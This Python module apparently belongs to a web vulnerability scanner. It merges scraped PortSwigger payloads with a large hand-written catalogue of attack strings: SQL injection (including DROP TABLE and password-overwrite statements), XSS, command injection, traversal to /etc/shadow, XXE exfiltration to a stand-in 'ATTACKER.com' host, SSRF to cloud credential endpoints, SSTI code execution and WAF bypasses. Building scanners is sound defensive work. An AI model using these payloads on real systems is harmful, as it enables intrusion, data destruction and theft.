"""
Enhanced Payload Manager
========================

Centralized payload management system for the Sudarshan Web Vulnerability Scanner.
Combines PortSwigger Academy payloads with custom payloads, providing a unified API
for all vulnerability scanners.

Features:
    - Loads 2000+ PortSwigger Academy payloads from Task 1 output
    - Maintains comprehensive custom payloads for backward compatibility
    - Progressive difficulty testing (apprentice → practitioner → expert)
    - Deduplication across sources
    - Thread-safe singleton for Celery workers

Usage:
    from app.scanner.payload_manager import get_payload_manager
    pm = get_payload_manager()
    payloads = pm.get_payloads('sql_injection', difficulty='apprentice', max_payloads=50)
"""

import json
import threading
from pathlib import Path
from typing import Dict, List, Optional


class PayloadManager:
    """
    Centralized payload management system.

    Integrates PortSwigger Academy payloads (from Task 1 scraper output) with
    hand-crafted custom payloads, organized by vulnerability type and difficulty.

    Attributes:
        portswigger_payloads: {vuln_type: {difficulty: [payload_strings]}}
        custom_payloads:      {vuln_type: {technique: [payload_strings]}}
    """

    # ── PortSwigger category slug → scanner vuln_type mapping ────────
    CATEGORY_MAPPING = {
        # Core scanners (already implemented)
        'sql-injection': 'sql_injection',
        'cross-site-scripting': 'xss',
        'cross-site-request-forgery-csrf': 'csrf',
        'os-command-injection': 'command_injection',
        'path-traversal': 'directory_traversal',
        'xml-external-entity-xxe-injection': 'xxe',
        'server-side-request-forgery-ssrf': 'ssrf',
        'clickjacking': 'clickjacking',
        'cross-origin-resource-sharing-cors': 'cors',

        # Additional scanners / future integration
        'dom-based-vulnerabilities': 'dom_xss',
        'http-request-smuggling': 'http_smuggling',
        'server-side-template-injection': 'ssti',
        'access-control-vulnerabilities': 'access_control',
        'authentication': 'auth_bypass',
        'websockets': 'websockets',
        'web-cache-poisoning': 'cache_poisoning',
        'insecure-deserialization': 'deserialization',
        'information-disclosure': 'info_disclosure',
        'business-logic-vulnerabilities': 'business_logic',
        'http-host-header-attacks': 'host_header',
        'oauth-authentication': 'oauth',
        'file-upload-vulnerabilities': 'file_upload',
        'jwt': 'jwt',
        'nosql-injection': 'nosql_injection',
        'prototype-pollution': 'prototype_pollution',
        'race-conditions': 'race_conditions',
        'api-testing': 'api_testing',
        'graphql-api-vulnerabilities': 'graphql',
        'web-llm-attacks': 'web_llm',
        'web-cache-deception': 'cache_deception',
        'essential-skills': 'essential_skills',
    }

    DIFFICULTY_LEVELS = ('apprentice', 'practitioner', 'expert')

    def __init__(
        self,
        portswigger_path: str = 'data/portswigger_knowledge/payloads_by_category.json',
    ):
        """
        Initialize the payload manager.

        Args:
            portswigger_path: Path to the PortSwigger payloads JSON produced by Task 1.
        """
        self.portswigger_path = Path(portswigger_path)
        self.portswigger_payloads: Dict[str, Dict[str, List[str]]] = {}
        self.custom_payloads: Dict[str, Dict[str, List[str]]] = {}

        # Load sources
        self._load_portswigger_payloads()
        self._initialize_custom_payloads()

    # ================================================================
    # Loading
    # ================================================================

    def _load_portswigger_payloads(self) -> None:
        """
        Load and organize PortSwigger payloads by vuln_type and difficulty.

        Reads the JSON produced by ``scripts/portswigger_scraper.py`` and maps
        each PortSwigger category to a scanner vulnerability type using
        ``CATEGORY_MAPPING``.
        """
        if not self.portswigger_path.exists():
            print(f"[PayloadManager] PortSwigger data not found: {self.portswigger_path}")
            print(f"[PayloadManager] Run: python scripts/portswigger_scraper.py")
            return

        try:
            with open(self.portswigger_path, 'r', encoding='utf-8') as f:
                raw_data = json.load(f)
        except (json.JSONDecodeError, OSError) as exc:
            print(f"[PayloadManager] Error loading PortSwigger data: {exc}")
            return

        loaded = 0
        for ps_category, entries in raw_data.items():
            vuln_type = self.CATEGORY_MAPPING.get(ps_category, ps_category)

            if vuln_type not in self.portswigger_payloads:
                self.portswigger_payloads[vuln_type] = {
                    'apprentice': [],
                    'practitioner': [],
                    'expert': [],
                    'all': [],
                }

            bucket = self.portswigger_payloads[vuln_type]
            seen = set(bucket['all'])

            for entry in entries:
                code = entry.get('payload', '').strip()
                if not code or code in seen:
                    continue
                seen.add(code)

                difficulty = entry.get('difficulty', 'unknown').lower()
                bucket['all'].append(code)
                if difficulty in self.DIFFICULTY_LEVELS:
                    bucket[difficulty].append(code)
                loaded += 1

        cats = len(self.portswigger_payloads)
        print(f"[PayloadManager] Loaded {loaded} PortSwigger payloads across {cats} types")

    # ================================================================
    # Custom payloads
    # ================================================================

    def _initialize_custom_payloads(self) -> None:
        """Define hand-crafted payloads for each vulnerability type."""

        self.custom_payloads = {
            # ── SQL Injection ────────────────────────────────────────
            'sql_injection': {
                'error_based': [
                    "'", "''", '"',
                    "' OR '1'='1", "' OR '1'='1' --", "' OR '1'='1' #",
                    "' OR '1'='1' /*", '" OR "1"="1', '" OR "1"="1" --',
                    "1' ORDER BY 1--", "1' ORDER BY 100--",
                    "admin'--", "1; SELECT 1--",
                    "') OR ('1'='1", '") OR ("1"="1',
                    "1 OR 1=1", "' OR ''='",
                    "1)) OR ((1=1", "' AND 1=2 UNION SELECT NULL--",
                    "1' AND 1=CONVERT(int, (SELECT @@version))--",
                    "%' AND '1'='1",
                ],
                'union_based': [
                    "' UNION SELECT NULL--",
                    "' UNION SELECT NULL,NULL--",
                    "' UNION SELECT NULL,NULL,NULL--",
                    "' UNION ALL SELECT NULL--",
                    "' UNION SELECT username,password FROM users--",
                    "' UNION SELECT table_name,NULL FROM information_schema.tables--",
                    "' UNION SELECT column_name,NULL FROM information_schema.columns--",
                    "1' ORDER BY 10--",
                    "1' GROUP BY 1,2,3,4,5--",
                ],
                'time_based': [
                    "1' AND SLEEP(3)--",
                    "' OR SLEEP(3)--",
                    "' OR SLEEP(3)#",
                    "'; WAITFOR DELAY '0:0:3'--",
                    "' OR pg_sleep(3)--",
                    "'; SELECT pg_sleep(3)--",
                    "1 AND (SELECT * FROM (SELECT(SLEEP(3)))a)--",
                    "' OR BENCHMARK(5000000,SHA1('test'))--",
                ],
                'boolean_based': [
                    "1' AND '1'='1", "1' AND '1'='2",
                    "' OR 1=1 --", "' OR 1=2 --",
                    "1' AND 1=1 AND '1'='1", "1' AND 1=2 AND '1'='1",
                    "' AND 'a'='a", "' AND 'a'='b",
                ],
                'stacked': [
                    "'; DROP TABLE users--",
                    "'; INSERT INTO users VALUES('hacked','hacked')--",
                    "1; UPDATE users SET password='hacked' WHERE username='admin'--",
                ],
            },

            # ── Cross-Site Scripting (XSS) ───────────────────────────
            'xss': {
                'basic': [
                    "<script>alert(1)</script>",
                    "<script>alert('XSS')</script>",
                    "<script>alert(document.cookie)</script>",
                    "<img src=x onerror=alert(1)>",
                    "<svg onload=alert(1)>",
                    "<body onload=alert(1)>",
                    "javascript:alert(1)",
                    "'-alert(1)-'",
                    '"-alert(1)-"',
                ],
                'encoded': [
                    "%3Cscript%3Ealert(1)%3C/script%3E",
                    "&#60;script&#62;alert(1)&#60;/script&#62;",
                    "<scr<script>ipt>alert(1)</scr</script>ipt>",
                    "<ScRiPt>alert(1)</ScRiPt>",
                    "<<script>alert(1)//<</script>",
                    "<img src=x onerror=&#97;&#108;&#101;&#114;&#116;(1)>",
                    "\\x3cscript\\x3ealert(1)\\x3c/script\\x3e",
                ],
                'event_handlers': [
                    "<body onload=alert(1)>",
                    "<input onfocus=alert(1) autofocus>",
                    "<marquee onstart=alert(1)>",
                    "<details open ontoggle=alert(1)>",
                    "<video src=x onerror=alert(1)>",
                    "<audio src=x onerror=alert(1)>",
                    '<div onmouseover="alert(1)">hover me</div>',
                    "<select onfocus=alert(1) autofocus>",
                    "<textarea onfocus=alert(1) autofocus>",
                ],
                'dom_based': [
                    "javascript:alert(document.domain)",
                    "#<script>alert(1)</script>",
                    "?default=<script>alert(1)</script>",
                    "{{7*7}}", "${7*7}",
                    "<img src=1 onerror=alert(document.domain)>",
                ],
                'polyglots': [
                    "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert() )//%%0teleD//0teleA//",
                    "'-alert(1)-'",
                    "\"><img src=x onerror=alert(1)>",
                    "'><svg/onload=alert(1)>",
                ],
            },

            # ── Command Injection ────────────────────────────────────
            'command_injection': {
                'linux': [
                    "; ls", "&& ls", "| ls",
                    "; whoami", "&& whoami", "| whoami",
                    "; cat /etc/passwd", "| cat /etc/passwd",
                    "; id", "&& id", "| id",
                    "$(whoami)", "`whoami`",
                    "; ping -c 1 127.0.0.1",
                    "| sleep 5", "; sleep 5",
                    "; uname -a", "| uname -a",
                    "\nwhoami", "\n/usr/bin/id",
                ],
                'windows': [
                    "& dir", "&& dir", "| dir",
                    "& whoami", "&& whoami", "| whoami",
                    "& type C:\\Windows\\win.ini",
                    "& net user",
                    "& ipconfig /all",
                    "& ping -n 1 127.0.0.1",
                    "| timeout 5",
                ],
                'blind': [
                    "; sleep 5", "| sleep 5 #",
                    "&& sleep 5", "|| sleep 5",
                    "; ping -c 5 127.0.0.1",
                    "& ping -n 5 127.0.0.1",
                    "$(sleep 5)", "`sleep 5`",
                    "| timeout /t 5",
                ],
            },

            # ── Directory Traversal ──────────────────────────────────
            'directory_traversal': {
                'linux': [
                    "../etc/passwd",
                    "../../etc/passwd",
                    "../../../etc/passwd",
                    "../../../../etc/passwd",
                    "../../../../../etc/passwd",
                    "../../../../../../etc/passwd",
                    "../../../etc/shadow",
                    "../../../proc/self/environ",
                    "....//....//....//etc/passwd",
                    "..%2f..%2f..%2fetc%2fpasswd",
                    "%2e%2e/%2e%2e/%2e%2e/etc/passwd",
                    "..%252f..%252f..%252fetc/passwd",
                    "/etc/passwd",
                    "/etc/hosts",
                ],
                'windows': [
                    "..\\windows\\win.ini",
                    "..\\..\\windows\\win.ini",
                    "..\\..\\..\\windows\\win.ini",
                    "..\\..\\..\\..\\windows\\win.ini",
                    "..%5c..%5c..%5cwindows%5cwin.ini",
                    "..%255c..%255c..%255cwindows%255cwin.ini",
                    "\\windows\\win.ini",
                    "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
                ],
                'null_byte': [
                    "../../../etc/passwd%00",
                    "../../../etc/passwd%00.jpg",
                    "../../../etc/passwd%00.png",
                    "....//....//....//etc/passwd%00",
                ],
            },

            # ── XXE (XML External Entity) ────────────────────────────
            'xxe': {
                'file_retrieval': [
                    '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
                    '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/hostname">]><foo>&xxe;</foo>',
                    '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]><foo>&xxe;</foo>',
                    '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/shadow">]><foo>&xxe;</foo>',
                ],
                'ssrf_via_xxe': [
                    '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]><foo>&xxe;</foo>',
                    '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://localhost:8080/">]><foo>&xxe;</foo>',
                    '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://127.0.0.1/">]><foo>&xxe;</foo>',
                ],
                'oob_xxe': [
                    '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://ATTACKER.com/evil.dtd">%xxe;]><foo>bar</foo>',
                    '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "https://ATTACKER.com/?data=exfil">]><foo>&xxe;</foo>',
                ],
                'parameter_entity': [
                    '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "file:///etc/passwd"><!ENTITY callhome SYSTEM "http://ATTACKER.com/?%xxe;">]><foo>&callhome;</foo>',
                ],
            },

            # ── SSRF (Server-Side Request Forgery) ───────────────────
            'ssrf': {
                'localhost': [
                    "http://localhost/",
                    "http://localhost:80/",
                    "http://localhost:8080/",
                    "http://localhost:443/",
                    "http://127.0.0.1/",
                    "http://127.0.0.1:80/",
                    "http://127.0.0.1:8080/",
                    "http://[::1]/",
                    "http://0.0.0.0/",
                    "http://0x7f000001/",
                    "http://2130706433/",
                    "http://017700000001/",
                    "http://localhost/admin",
                    "http://127.0.0.1/admin",
                ],
                'cloud_metadata': [
                    "http://169.254.169.254/latest/meta-data/",
                    "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
                    "http://169.254.169.254/latest/user-data",
                    "http://metadata.google.internal/computeMetadata/v1/",
                    "http://169.254.169.254/metadata/v1/",
                    "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
                ],
                'internal_scan': [
                    "http://10.0.0.1/",
                    "http://172.16.0.1/",
                    "http://192.168.0.1/",
                    "http://192.168.1.1/",
                ],
                'protocol_smuggling': [
                    "file:///etc/passwd",
                    "file:///c:/windows/win.ini",
                    "dict://localhost:11211/stat",
                    "gopher://localhost:25/",
                ],
            },

            # ── CSRF (Cross-Site Request Forgery) ────────────────────
            'csrf': {
                'tokens': [
                    "",  # Empty token
                    "invalid_csrf_token",
                    "0" * 32,
                    "a" * 64,
                    "null",
                    "undefined",
                ],
            },

            # ── Clickjacking ─────────────────────────────────────────
            'clickjacking': {
                'iframe_tests': [
                    '<iframe src="TARGET_URL" width="500" height="500"></iframe>',
                    '<iframe src="TARGET_URL" style="opacity:0.0001; position:absolute;"></iframe>',
                ],
            },

            # ── CORS ─────────────────────────────────────────────────
            'cors': {
                'origins': [
                    "https://evil.com",
                    "https://attacker.com",
                    "null",
                    "https://TARGET_DOMAIN.evil.com",
                    "https://evil-TARGET_DOMAIN.com",
                ],
            },

            # ── NoSQL Injection ──────────────────────────────────────
            'nosql_injection': {
                'mongodb': [
                    '{"$gt":""}',
                    '{"$ne":""}',
                    '{"$regex":".*"}',
                    "' || '1'=='1",
                    '{"$where":"sleep(3000)"}',
                    "admin' || '' === '",
                    '{"username":{"$ne":""},"password":{"$ne":""}}',
                ],
            },

            # ── Server-Side Template Injection ───────────────────────
            'ssti': {
                'detection': [
                    "{{7*7}}", "${7*7}", "<%= 7*7 %>",
                    "#{7*7}", "*{7*7}", "{{7*'7'}}",
                    "${{7*7}}", "{{config}}", "{{self}}",
                ],
                'exploitation': [
                    "{{config.__class__.__init__.__globals__['os'].popen('id').read()}}",
                    "{{''.__class__.__mro__[2].__subclasses__()}}",
                    "${T(java.lang.Runtime).getRuntime().exec('id')}",
                ],
            },

            # ── File Upload ──────────────────────────────────────────
            'file_upload': {
                'extensions': [
                    ".php", ".php5", ".phtml", ".phar",
                    ".asp", ".aspx", ".jsp", ".jspx",
                    ".py", ".pl", ".cgi", ".sh",
                    ".svg", ".html", ".htm", ".shtml",
                ],
            },

            # ── JWT ──────────────────────────────────────────────────
            'jwt': {
                'algorithm_confusion': [
                    '{"alg":"none"}',
                    '{"alg":"None"}',
                    '{"alg":"NONE"}',
                    '{"alg":"nOnE"}',
                    '{"alg":"HS256"}',  # alg confusion with RS256
                ],
            },

            # ── WAF Bypass Payloads ──────────────────────────────────
            'waf_bypass': {
                'sql_injection': [
                    # Case alternation
                    "' oR '1'='1", "' Or '1'='1' --", "' sElEcT 1--",
                    "' UnIoN SeLeCt NuLl--",
                    # Comment insertion
                    "' UN/**/ION SEL/**/ECT NULL--",
                    "' UN%0bION SEL%0bECT NULL--",
                    "' /*!UNION*/ /*!SELECT*/ NULL--",
                    # Double encoding
                    "%2527%2520OR%25201%253D1--",
                    "%252f%252a*/UNION%252f%252a*/SELECT",
                    # Whitespace alternatives
                    "'+OR+1=1--", "'+UNION+SELECT+NULL--",
                    "'\tOR\t1=1--", "'\nUNION\nSELECT\nNULL--",
                    "'+OR+1=1--+",
                    # Hex encoding
                    "' OR 0x31=0x31--",
                    "' UNION SELECT 0x61646d696e--",
                    # Inline comments (MySQL)
                    "' OR 1=1#", "'/*!50000UNION*//*!50000SELECT*/NULL--",
                ],
                'xss': [
                    # Case alternation
                    "<ScRiPt>alert(1)</ScRiPt>",
                    "<sCrIpT>alert(1)</sCrIpT>",
                    # HTML entity encoding
                    "&#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;",
                    "&#60;script&#62;alert(1)&#60;/script&#62;",
                    "&lt;script&gt;alert(1)&lt;/script&gt;",
                    # Unicode normalization
                    "\uff1cscript\uff1ealert(1)\uff1c/script\uff1e",
                    # Double encoding
                    "%253Cscript%253Ealert(1)%253C%252Fscript%253E",
                    "%3C%73%63%72%69%70%74%3Ealert(1)%3C%2F%73%63%72%69%70%74%3E",
                    # Null byte injection
                    "<scr%00ipt>alert(1)</scr%00ipt>",
                    "\x00<script>alert(1)</script>",
                    # Tag obfuscation
                    "<svg/onload=alert(1)>",
                    "<svg\tonload=alert(1)>",
                    "<svg\nonload=alert(1)>",
                    "<img src=x onerror=alert`1`>",
                    # Using atob
                    "<img src=x onerror=eval(atob('YWxlcnQoMSk='))>",
                    # Protocol obfuscation
                    "jav&#x09;ascript:alert(1)",
                    "java\tscript:alert(1)",
                ],
                'command_injection': [
                    # Null byte
                    "%00; whoami", "test%00|id",
                    # Variable substitution
                    ";$({whoami})", "&&${IFS}whoami",
                    # IFS (Internal Field Separator)
                    ";${IFS}cat${IFS}/etc/passwd",
                    "&&${IFS}id",
                    # Brace expansion
                    ";{cat,/etc/passwd}",
                    # Hex encoding
                    ";$(printf '\\x77\\x68\\x6f\\x61\\x6d\\x69')",
                    # Backtick nesting
                    ";`echo whoami | sh`",
                    # Newline bypass
                    "%0awhoami", "%0d%0awhoami",
                    # Tab bypass
                    ";\twhoami", "|\twhoami",
                ],
                'path_traversal': [
                    # Double encoding
                    "..%252f..%252f..%252fetc%252fpasswd",
                    "%252e%252e%252f%252e%252e%252fetc/passwd",
                    # UTF-8 overlong encoding
                    "..%c0%af..%c0%afetc%c0%afpasswd",
                    "..%c1%9c..%c1%9cetc%c1%9cpasswd",
                    # Null byte
                    "../../../etc/passwd%00.jpg",
                    "../../../etc/passwd%00.html",
                    # Mixed slashes
                    "..\\..\\..\\etc\\passwd",
                    "..%5c..%5c..%5cetc%5cpasswd",
                    # Double dots with URL encoding
                    "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
                    "..%00/..%00/..%00/etc/passwd",
                ],
            },
        }

    # ================================================================
    # Public API
    # ================================================================

    def get_payloads(
        self,
        vuln_type: str,
        difficulty: str = 'all',
        source: str = 'both',
        max_payloads: Optional[int] = None,
    ) -> List[str]:
        """
        Return a deduplicated list of payloads for the given vulnerability type.

        Args:
            vuln_type:    e.g. ``'sql_injection'``, ``'xss'``
            difficulty:   ``'apprentice'``, ``'practitioner'``, ``'expert'``, or ``'all'``
            source:       ``'portswigger'``, ``'custom'``, or ``'both'``
            max_payloads: Optional cap on the number of payloads returned.

        Returns:
            List of unique payload strings (insertion-order preserved).
        """
        result: List[str] = []
        seen: set = set()

        def _add(payloads: List[str]) -> None:
            for p in payloads:
                if p not in seen:
                    seen.add(p)
                    result.append(p)

        # Collect from custom payloads
        if source in ('custom', 'both'):
            techniques = self.custom_payloads.get(vuln_type, {})
            for technique_payloads in techniques.values():
                _add(technique_payloads)

        # Collect from PortSwigger payloads
        if source in ('portswigger', 'both'):
            ps_bucket = self.portswigger_payloads.get(vuln_type, {})
            if difficulty == 'all':
                _add(ps_bucket.get('all', []))
            else:
                _add(ps_bucket.get(difficulty, []))

        # Apply limit
        if max_payloads is not None:
            result = result[:max_payloads]

        return result

    def get_payloads_by_technique(
        self,
        vuln_type: str,
        technique: str,
    ) -> List[str]:
        """
        Return custom payloads for a specific technique.

        Args:
            vuln_type: e.g. ``'sql_injection'``
            technique: e.g. ``'error_based'``, ``'union_based'``

        Returns:
            List of payload strings for that technique.
        """
        return list(self.custom_payloads.get(vuln_type, {}).get(technique, []))

    def get_progressive_payloads(
        self,
        vuln_type: str,
        max_per_level: int = 10,
    ) -> Dict[str, List[str]]:
        """
        Return payloads organized by increasing difficulty for progressive testing.

        Starts with simple apprentice-level payloads and escalates to expert.
        Custom payloads are always included in the apprentice tier as a baseline.

        Args:
            vuln_type:     Vulnerability type.
            max_per_level: Maximum payloads per difficulty tier.

        Returns:
            ``{'apprentice': [...], 'practitioner': [...], 'expert': [...]}``
        """
        return {
            level: self.get_payloads(vuln_type, level, 'both', max_per_level)
            for level in self.DIFFICULTY_LEVELS
        }

    def get_stats(self) -> Dict:
        """
        Return payload statistics across all sources.

        Returns:
            ``{'portswigger': {type: count}, 'custom': {type: count}, 'total': {type: count}}``
        """
        ps_stats: Dict[str, int] = {}
        for vt, buckets in self.portswigger_payloads.items():
            ps_stats[vt] = len(buckets.get('all', []))

        custom_stats: Dict[str, int] = {}
        for vt, techniques in self.custom_payloads.items():
            custom_stats[vt] = sum(len(plist) for plist in techniques.values())

        # Merge keys
        all_types = set(ps_stats) | set(custom_stats)
        total_stats = {
            vt: ps_stats.get(vt, 0) + custom_stats.get(vt, 0)
            for vt in all_types
        }

        return {
            'portswigger': ps_stats,
            'custom': custom_stats,
            'total': total_stats,
        }

    def list_vuln_types(self) -> List[str]:
        """Return all vulnerability types that have at least one payload."""
        types = set(self.portswigger_payloads) | set(self.custom_payloads)
        return sorted(types)


# ====================================================================
# Thread-safe singleton
# ====================================================================

_payload_manager: Optional[PayloadManager] = None
_lock = threading.Lock()


def get_payload_manager(
    portswigger_path: str = 'data/portswigger_knowledge/payloads_by_category.json',
) -> PayloadManager:
    """
    Return a singleton ``PayloadManager`` instance.

    Thread-safe — safe for use in Celery workers and Flask request handlers.

    Args:
        portswigger_path: Overridable path to the PortSwigger JSON (only used
                          for the first initialization).

    Returns:
        Shared ``PayloadManager`` instance.
    """
    global _payload_manager
    if _payload_manager is None:
        with _lock:
            if _payload_manager is None:     # double-checked locking
                _payload_manager = PayloadManager(portswigger_path)
    return _payload_manager
